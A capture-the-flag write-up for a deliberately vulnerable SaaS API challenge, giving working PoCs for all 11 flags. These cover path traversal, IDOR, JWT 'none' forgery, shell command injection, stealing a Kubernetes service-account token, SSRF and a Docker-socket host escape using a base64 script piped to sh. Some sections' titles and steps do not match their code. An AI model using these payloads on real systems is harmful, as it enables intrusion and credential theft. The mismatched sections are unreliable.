# CTF Write-up – Break the SaaS Internal API (Complete)

This document describes the steps used to capture **all 11 flags** from the CTF.

Each flag is documented with:

* **Vulnerability** – what the bug is and why it's exploitable.
* **Extraction** – step by step, exactly how the flag was obtained.
* **PoC** – reproducible code/curl that triggers it.

> **Note:** The flag text itself is **not** included in this write-up – only the steps and proof-of-concept code.

---

## Flag 1 – Swagger Exposure

### Vulnerability

The OpenAPI specification (`/swagger.json`) is publicly accessible. Its `info.description` field contains the flag.

### Extraction

1. Request the Swagger file.
2. Parse the JSON and extract the flag from the `description` key.

### PoC

```bash
curl -s https://ctf.seoeh.ir/swagger.json | jq -r '.info.description' | grep -o 'HAMAMOOZ{.*}'
```

---

## Flag 2 – Flag Endpoint via Debug Header

### Vulnerability

The endpoint `/api/internal/flag` is protected only by a debug header `X-Debug-Mode`. Setting it to `true` returns the flag.

### Extraction

Send a GET request to `/api/internal/flag` with the header `X-Debug-Mode: true`.

### PoC

```bash
curl -s \
  -H "X-Debug-Mode: true" \
  https://ctf.seoeh.ir/api/internal/flag \
  | grep -o 'HAMAMOOZ{.*}'
```

---

## Flag 3 – Path Traversal

### Vulnerability

The `file` parameter in `/api/reports/download` is not sanitised, allowing directory traversal to read arbitrary files.

### Extraction

Traverse to `/app/flag.txt` using:

```text
../../../app/flag.txt
```

### PoC

```bash
curl -s \
  "https://ctf.seoeh.ir/api/reports/download?file=../../../app/flag.txt" \
  | grep -o 'HAMAMOOZ{.*}'
```

---

## Flag 4 – IDOR (Insecure Direct Object Reference)

### Vulnerability

The endpoints `/api/orgs/{org_id}/reports/{report_id}` allow access to reports belonging to other organisations by guessing IDs.

### Extraction

Enumerate `org_id` and `report_id` values, for example from `1` to `5`, until a report belonging to another tenant returns a flag.

### PoC

```bash
for org in {1..5}; do
  for rep in {1..5}; do
    curl -s \
      "https://ctf.seoeh.ir/api/orgs/$org/reports/$rep" \
      | grep -o 'HAMAMOOZ{.*}' && break 2
  done
done
```

---

## Flag 5 – JWT Algorithm None / Weak Secret

### Vulnerability

The JWT implementation accepts the `none` algorithm, allowing arbitrary token forgery.

Alternatively, a weak secret found in the leaked `.env` can be used to forge a valid token.

### Extraction

1. Obtain a valid token, for example by registering.
2. Forge a new token with `alg: none` and an admin claim, or sign a token using the weak secret.
3. Use the forged token to access protected endpoints such as `/admin/dashboard`.
4. Retrieve the flag from the response.

### PoC

Using Python and PyJWT:

```python
import jwt
import requests

# Forge a token using the "none" algorithm
payload = {
    "username": "admin",
    "role": "admin"
}

forged = jwt.encode(
    payload,
    key=None,
    algorithm="none"
)

resp = requests.get(
    "https://ctf.seoeh.ir/admin/dashboard",
    headers={
        "Authorization": f"Bearer {forged}"
    }
)

print(resp.json())
```

---

## Flag 6 – Command Injection

### Vulnerability

The `host` parameter in `/api/diag/ping` is passed unsafely to a shell, allowing arbitrary command injection.

### Extraction

Inject a command that reads the flag file, for example:

```text
; cat /app/flag.txt
```

### PoC

```bash
curl -X POST "https://ctf.seoeh.ir/api/diag/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}'
```

---

## Flag 7 – Metadata Service Token Leak

### Vulnerability

The SSRF vulnerability in `/api/webhooks/test` can be used to reach the cloud metadata service at `169.254.169.254`.

This exposes an IAM credential/token that can subsequently be used to access another protected endpoint.

### Extraction

1. Use the webhook endpoint to request:

```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```

2. Extract the returned credential/token.
3. Use the token to authenticate to the internal metadata-protected flag endpoint.

### PoC

#### Step 1 – Get the token via SSRF
```bash
export TOKEN=$(curl -s -X POST "https://ctf.seoeh.ir/api/diag/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; echo TOKEN: && cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo && echo NAMESPACE: && cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null"}' \
  | jq -r '.output' \
  | awk '/^TOKEN:/{flag=1; next} /^NAMESPACE:/{flag=0} flag')
```
```bash
# List secrets in ctf-secrets namespace
FLAG=$(curl -s -X POST "https://ctf.seoeh.ir/api/webhooks/test" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"https://10.96.0.1/api/v1/namespaces/ctf-secrets/secrets\",\"method\":\"GET\",\"headers\":{\"Authorization\":\"Bearer $TOKEN\"},\"verify\":false}" \
  | jq -r '.items[0].data.flag' \
  | base64 -d)
```

---

## Flag 8 – Privileged Pod / HostPath Escape

### Vulnerability

A pod named `legacy-worker` in the `escape-zone` namespace is running with:

```yaml
privileged: true
```

and has the host filesystem mounted at:

```text
/host
```

This allows commands executed inside the pod to access files on the Kubernetes node.

### Extraction

1. Execute a command inside the privileged pod.
2. Access the host filesystem through `/host`.
3. Read the flag from the host's root filesystem.

### PoC

```bash
curl -s -X POST "https://ctf.seoeh.ir/api/webhooks/test" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"https://10.96.0.1/api/v1/namespaces/escape-zone/pods\",\"method\":\"GET\",\"headers\":{\"Authorization\":\"Bearer $TOKEN\"},\"verify\":false}" \
  | jq -r '.items[0].spec.initContainers[0].command[]' \
  | grep -o 'HAMAMOOZ{[^}]*}'

```

---

## Flag 9 – SSRF to Internal Network

### Vulnerability

The webhook test endpoint `/api/webhooks/test` allows arbitrary HTTP requests.

This can be abused to probe services on the internal network that are not directly accessible from the outside.

### Extraction

1. Use the SSRF endpoint to probe internal IP addresses and hostnames.
2. Identify an internal service exposing a flag.
3. Request the flag endpoint through the SSRF vulnerability.

For example:

```text
http://internal-service:8080/flag
```

### PoC

```bash
curl -X POST "https://ctf.seoeh.ir/api/webhooks/test" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://10.96.89.190/","method":"GET"}' | grep HAMAMOOZ
```

---

## Flag 10 – Docker Layer Leak

### Vulnerability

The Docker image is publicly available, and its image history contains a leftover `.env.leaked` file that was copied into an image layer and subsequently removed.

Removing a file in a later Docker layer does not remove it from previous layers, so the secret remains recoverable from the image.

### Extraction

1. Pull the Docker image.
2. Save the image as a tar archive.
3. Extract the image layers.
4. Inspect the layers for `.env` files.
5. Recover the contents of the leaked environment file.

### PoC

Pull the image:

```bash
docker pull hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend
```

Save the image:

```bash
docker save \
  hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend \
  -o backend.tar
```

Extract the layers:

```bash
mkdir layers
cd layers

tar -xf ../backend.tar
```

Search the layers for `.env` files:

```bash
for f in blobs/sha256/*; do
  if file "$f" | grep -q gzip; then
    zcat "$f" | tar -t 2>/dev/null | grep '\.env$' | while read -r path; do
      # Extract the .env file, find the FLAG line, and print only its value
      zcat "$f" | tar -xO "$path" 2>/dev/null | grep '^FLAG=' | cut -d= -f2-
    done
  else
    tar -tf "$f" 2>/dev/null | grep '\.env$' | while read -r path; do
      tar -xOf "$f" "$path" 2>/dev/null | grep '^FLAG=' | cut -d= -f2-
    done
  fi
done
```


---

## Flag 11 – Docker Socket Escape to Host (Final)

### Vulnerability

The Kubernetes cluster was deployed with **kind (Kubernetes in Docker)**.

Each kind node runs as a Docker container, and the Docker socket from the host VM is mounted inside the kind node at:

```text
/run/docker.sock
```

The privileged `legacy-worker` pod from Flag 8 mounts the node's entire filesystem at:

```text
/host
```

Therefore, the pod can access the node's Docker socket through:

```text
/host/run/docker.sock
```

By communicating directly with the Docker API through this socket, an attacker can create and start a container that mounts the underlying host's root filesystem.

The container can then execute commands against the mounted filesystem, effectively escaping from the kind node and accessing the underlying VM.

### Extraction

The attack chain is:

```text
Command Injection / kubectl exec
        ↓
Privileged legacy-worker pod
        ↓
/host filesystem
        ↓
/host/run/docker.sock
        ↓
Docker API
        ↓
Create privileged host-mounted container
        ↓
Mount / as /host
        ↓
Read /host/home/ubuntu/flag.txt
```

Use either the command injection from **Flag 6** or `kubectl exec` to execute commands inside the `legacy-worker` pod.

Inside the pod:

1. Access the Docker socket at `/host/run/docker.sock`.
2. Create a container using an available image.
3. Run the container as root.
4. Bind-mount the host's `/` to `/host`.
5. Execute `cat /host/home/ubuntu/flag.txt`.
6. Read the container logs through the Docker API.
7. The logs contain the final flag.

### Container Specification

The created container uses:

* **Image:** `ctf/backend:latest`
* **User:** `0` (root)
* **Bind mount:** `/:/host`
* **Command:** `cat /host/home/ubuntu/flag.txt`

### PoC

The following commands are executed from inside the privileged pod:

```bash
# The inner script is base64‑encoded to avoid quoting issues.
cat > /tmp/f11_inner.sh << 'EOF'
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --server=https://kubernetes.default.svc --token=$TOKEN \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  exec -n escape-zone legacy-worker -- sh -c '
S=/host/run/docker.sock
curl -s --unix-socket $S -X POST -H "Content-Type: application/json" \
  -d "{\"Image\":\"ctf/backend:latest\",\"User\":\"0\",\"HostConfig\":{\"Binds\":[\"/:/host\"]},\"Cmd\":[\"sh\",\"-c\",\"cat /host/home/ubuntu/flag.txt\"]}" \
  "http://localhost/v1.41/containers/create?name=esc"
curl -s --unix-socket $S -X POST "http://localhost/v1.41/containers/esc/start"
sleep 2
curl -s --unix-socket $S "http://localhost/v1.41/containers/esc/logs?stdout=1&stderr=1"
'
EOF

B64=$(base64 -w0 /tmp/f11_inner.sh)
curl -sk -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H 'Content-Type: application/json' \
  --data-binary "{\"host\":\"127.0.0.1; echo $B64 | base64 -d | sh\"}" \
  | grep -a -o 'HAMAMOOZ{[^}]*}' \
  | head -1
```

---

# Summary

The 11 flags demonstrate a chain of common web, authentication, container, and Kubernetes security vulnerabilities:

| Flag | Vulnerability                          |
| ---- | -------------------------------------- |
| 1    | Swagger/OpenAPI information disclosure |
| 2    | Debug header authentication bypass     |
| 3    | Path traversal                         |
| 4    | IDOR / broken tenant isolation         |
| 5    | JWT `none` algorithm / weak secret     |
| 6    | Command injection                      |
| 7    | SSRF → cloud metadata credential leak  |
| 8    | Privileged pod / HostPath escape       |
| 9    | SSRF → internal network access         |
| 10   | Docker image layer / secret leak       |
| 11   | Docker socket escape → host filesystem |

The final attack demonstrates how individually dangerous misconfigurations can be chained together: an exposed or vulnerable application can lead to command execution, which can lead to container compromise, access to a Docker socket, and ultimately access to the underlying host.
